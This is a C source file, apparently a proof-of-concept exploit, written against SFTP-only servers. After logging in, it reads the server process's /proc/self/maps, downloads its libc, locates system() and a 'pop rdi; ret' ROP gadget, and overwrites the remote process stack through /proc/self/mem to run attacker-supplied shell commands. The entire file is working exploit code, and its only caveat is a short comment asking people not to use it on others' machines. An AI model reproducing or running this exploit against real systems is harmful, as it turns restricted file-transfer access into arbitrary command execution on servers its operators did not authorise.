#define _GNU_SOURCE

// THIS PROGRAM IS NOT DESIGNED TO BE SAFE AGAINST VICTIM MACHINES THAT
// TRY TO ATTACK BACK, THE CODE IS SLOPPY!
// (In other words, please don't use this against other people's machines.)

#include <libssh/libssh.h>
#include <libssh/sftp.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>

#define min(a,b) (((a)<(b))?(a):(b))

sftp_session sftp;

size_t grab_file(char *rpath, char **out) {
  size_t allocated = 4000, used = 0;
  *out = calloc(1, allocated+1);
  sftp_file f = sftp_open(sftp, rpath, O_RDONLY, 0);
  if (f == NULL) fprintf(stderr, "Error opening remote file %s: %s\n", rpath, ssh_get_error(sftp)), exit(1);
  while (1) {
    ssize_t nbytes = sftp_read(f, *out+used, allocated-used);
    if (nbytes < 0) fprintf(stderr, "Error reading remote file %s: %s\n", rpath, ssh_get_error(sftp)), exit(1);
    if (nbytes == 0) {
      (*out)[used] = '\0';
      sftp_close(f);
      return used;
    }
    used += nbytes;
    if (used == allocated) {
      allocated *= 4;
      *out = realloc(*out, allocated);
    }
  }
}

void dump_file(char *name, void *buf, size_t len) {
  FILE *f = fopen(name, "w+");
  if (!f) perror("can't write to local file"), exit(1);
  if (fwrite(buf, 1, len, f) != len) fprintf(stderr, "local write failed\n"), exit(1);
  if (fclose(f)) fprintf(stderr, "fclose error\n"), exit(1);
}

size_t slurp_file(char *path, char **out) {
  size_t allocated = 4000, used = 0;
  *out = calloc(1, allocated+1);
  FILE *f = fopen(path, "r");
  if (f == NULL) perror("opening local file failed"), exit(1);
  while (1) {
    ssize_t nbytes = fread(*out+used, 1, allocated-used, f);
    if (nbytes < 0) fprintf(stderr, "Error reading local file %s: %s\n", path, strerror(errno)), exit(1);
    if (nbytes == 0) {
      (*out)[used] = '\0';
      if (fclose(f)) fprintf(stderr, "fclose error\n"), exit(1);
      return used;
    }
    used += nbytes;
    if (used == allocated) {
      allocated *= 4;
      *out = realloc(*out, allocated);
    }
  }
}

int main(int argc, char **argv) {
  if (argc != 4) fprintf(stderr, "invocation: ./exploit host user 'shell commands here'\n"), exit(1);
  char *target_host = argv[1];
  char *target_user = argv[2];
  char *shell_commands = argv[3];

  ssh_session my_ssh_session;
  int rc;
  char *password;
  // Open session and set options
  my_ssh_session = ssh_new();
  if (my_ssh_session == NULL) exit(-1);
  ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, target_host);
  ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, target_user);
  // Connect to server
  rc = ssh_connect(my_ssh_session);
  if (rc != SSH_OK) fprintf(stderr, "Error connecting to host: %s\n", ssh_get_error(my_ssh_session)), exit(-1);

  // Authenticate ourselves
  password = getpass("Password: ");
  rc = ssh_userauth_password(my_ssh_session, NULL, password);
  if (rc != SSH_AUTH_SUCCESS)
    fprintf(stderr, "Error authenticating with password: %s\n", ssh_get_error(my_ssh_session)), exit(-1);

  sftp = sftp_new(my_ssh_session);
  if (sftp == NULL) fprintf(stderr, "Error allocating SFTP session: %s\n", ssh_get_error(my_ssh_session)), exit(-1);

  rc = sftp_init(sftp);
  if (rc != SSH_OK) {
    fprintf(stderr, "Error initializing SFTP session: %s.\n", ssh_get_error(sftp));
    sftp_free(sftp);
    return rc;
  }

  char *mappings;
  grab_file("/proc/self/maps", &mappings);
  //printf("/proc/self/maps dump: \n%s\n\n\n", mappings);

  printf("got /proc/self/maps. looking for libc...\n");
  // 7fc9e742b000-7fc9e75ad000 r-xp 00000000 fe:00 2753466                    /lib/x86_64-linux-gnu/libc-2.13.so
  long long start_addr, end_addr, offset;
  char *libc_path = NULL;
  long long stack_start_addr = 0, stack_end_addr;
  for (char *p = strtok(mappings, "\n"); p; p = strtok(NULL, "\n")) {
    if (strstr(p, " r-xp ") && strstr(p, "/libc-")) {
      if (libc_path) fprintf(stderr, "warning: two times libc?\n");
      printf("mapping line: %s\n", p);
      if (sscanf(p, "%Lx-%Lx %*4c %Lx", &start_addr, &end_addr, &offset) != 3) perror("scanf failed"), exit(1);
      libc_path = strdup(strchr(p, '/'));
      if (libc_path == NULL) fprintf(stderr, "no path in mapping?"), exit(1);
    }
    if (strstr(p, "[stack]")) {
      if (stack_start_addr != 0) fprintf(stderr, "two stacks? no."), exit(1);
      printf("mapping line: %s\n", p);
      if (sscanf(p, "%Lx-%Lx ", &stack_start_addr, &stack_end_addr) != 2) perror("scanf failed"), exit(1);
    }
  }
  if (libc_path == NULL) fprintf(stderr, "unable to find libc\n"), exit(1);
  if (stack_start_addr == 0) fprintf(stderr, "unable to find stack"), exit(1);
  printf("remote libc is at %s\n", libc_path);
  printf("offset %Lx from libc is mapped to %Lx-%Lx\n", offset, start_addr, end_addr);

  char *libc;
  size_t libc_size = grab_file(libc_path, &libc);
  dump_file("libc.so", libc, libc_size);
  printf("downloaded libc, size is %zu bytes\n", libc_size);

  system("objdump -T libc.so | grep ' system$' | cut -d' ' -f1 > system.addr");
  char *system_offset_str;
  slurp_file("system.addr", &system_offset_str);
  long long system_offset;
  if (sscanf(system_offset_str, "%Lx", &system_offset) != 1) perror("scanf failed"), exit(1);
  long long remote_system_addr = start_addr+system_offset-offset;
  printf("remote system() function is at %Lx\n", remote_system_addr);

  printf("looking for ROP gadget `pop rdi;ret` (0x5fc3) in libc...\n");
  char *gadget = memmem(libc+offset, end_addr-start_addr, "\x5f\xc3", 2);
  if (gadget == NULL) fprintf(stderr, "no gadget found :(\n"), exit(1);
  long long gadget_address = start_addr + (gadget-(libc+offset));
  long long ret_address = gadget_address+1;
  printf("found gadget at %Lx\n", gadget_address);

  printf("remote stack is at %Lx-%Lx\n", stack_start_addr, stack_end_addr);
  printf("doing it the quick-and-dirty way (that means: pray that the target"
         "program was compiled with gcc, giving us 16-byte stack alignment)...\n");
  long long stack_len = stack_end_addr - stack_start_addr;
  /*if (stack_len > 32000) {
    stack_len = 32000;
    stack_start_addr = stack_end_addr - stack_len;
  }*/
  char *new_stack = malloc(stack_len);

  // first fill it with our ret slide
  for (long long *s = (void*)new_stack; s<(long long*)(new_stack+stack_len); s++) {
    *s = ret_address;
  }

  // put some shell commands in the head
  strcpy(new_stack, shell_commands);

  // put the mini-ROP-chain at the end
  // [address of pop rdi] [stack head] [address of system]
  long long *se = (void*)(new_stack + stack_len);
  se[-3] = gadget_address;
  se[-2] = stack_start_addr;
  se[-1] = remote_system_addr;

  printf("Prepared the new stack. Now comes the moment of truth: push the new stack over and pray.\n");
  sftp_file mem = sftp_open(sftp, "/proc/self/mem", O_RDWR, 0);
  if (mem == NULL) fprintf(stderr, "Error opening remote memory: %s\n", ssh_get_error(sftp)), exit(1);

  // first send over the string
  rc = sftp_seek64(mem, stack_start_addr);
  if (rc) fprintf(stderr, "Error seeking to remote stack: %s\n", ssh_get_error(sftp)), exit(1);
  ssize_t mem_written = sftp_write(mem, new_stack, strlen(shell_commands)+1);
  if (mem_written != strlen(shell_commands)+1) fprintf(stderr, "didn't write the whole new stack\n");

  // now send over the rest right-to-left
  for (long long off = stack_len-32000; off >= 0; off -= 32000) {
    rc = sftp_seek64(mem, stack_start_addr+off);
    if (rc) fprintf(stderr, "Error seeking: %s\n", ssh_get_error(sftp)), exit(1);
    mem_written = sftp_write(mem, new_stack+off, 32000);
    if (mem_written != 32000) fprintf(stderr, "stack write failed – that's probably good :)\n"), exit(0);
  }

  return 0;
}